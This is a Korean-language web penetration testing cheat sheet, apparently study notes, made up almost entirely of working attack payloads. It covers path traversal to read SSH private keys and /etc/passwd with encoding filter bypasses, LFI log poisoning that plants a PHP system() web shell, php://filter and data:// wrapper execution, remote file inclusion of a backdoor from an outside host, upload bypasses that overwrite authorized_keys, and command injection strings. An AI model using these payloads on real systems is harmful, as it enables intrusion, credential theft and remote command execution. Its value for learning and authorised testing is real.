# phpinfo.php
- 파일에서 경로 및 사용 가능 코드 확인
- 확장 모듈 확인
---
# 🗂 Directory Traversal (Path Traversal)

`https://example.com/cms/login.php?language=en.html`  
→ `language` 파라미터로 특정 파일을 불러오는 정상 요청

`https://example.com/cms/login.php?language=../../../../home/kali/.ssh/id_rsa`  
→ 리눅스 사용자 SSH 개인키 접근

`https://example.com/cms/login.php?language=..\..\..\..\windows\win.ini`  
→ Windows 시스템 설정 파일(win.ini) 접근

---

## 🔑 인코딩이 필요할 때

`../../../../etc/passwd`  
→ 리눅스 사용자 계정 정보

`%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
→ `.`을 `%2e`로 인코딩하여 필터 우회

`%252e%252e/%252e%252e/etc/passwd`  
→ 이중 인코딩(Double Encoding)으로 필터 우회

---

# 📄 Local File Inclusion (LFI) - Log Poisoning

```bash
curl https://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
→ Apache `access.log`를 LFI로 불러오기

```text
User-Agent: <p><?php system($_REQUEST['cmd']); ?></p>
```
→ User-Agent에 PHP 코드 삽입(Log Poisoning)

```bash
../var/log/apache2/access.log&cmd=whoami
```
→ 삽입된 PHP 코드로 명령 실행

---

# 🐘 PHP Wrappers

```bash
curl https://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
→ `php://filter`로 파일을 Base64로 인코딩하여 소스코드 노출

```bash
curl "https://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
→ `data://` 래퍼로 Base64 인코딩된 PHP 코드 전달 후 `ls` 실행

---

# 🌐 Remote File Inclusion (RFI)

```bash
curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
→ 외부 서버의 악성 PHP 파일 로드 후 명령 실행

---

# 📤 File Upload Vulnerabilities

`example.php`  
→ 정상 PHP 파일

`example.pHP`  
→ 대소문자 변형으로 확장자 필터 우회

`example.php.txt`  
→ 이중 확장자로 필터 우회

`upload '../../../../../../../test.txt'`  
→ 업로드 경로를 벗어나 상위 디렉토리에 파일 저장

`upload '../../../../../root/.ssh/authorized_keys'`  
→ SSH 공개키 덮어써서 백도어 접속 가능

---

# 💻 Command Injection

`;ifconfig`  
→ 세미콜론(;)으로 기존 명령 종료 후 `ifconfig` 실행

`%3Bifconfig`  
→ 세미콜론(;)을 URL 인코딩한 버전

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
→ PowerShell 환경 여부 및 실행 위치 확인

---

## 📦 POST 데이터에 명령어 삽입하여 필터 우회 후 실행

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```
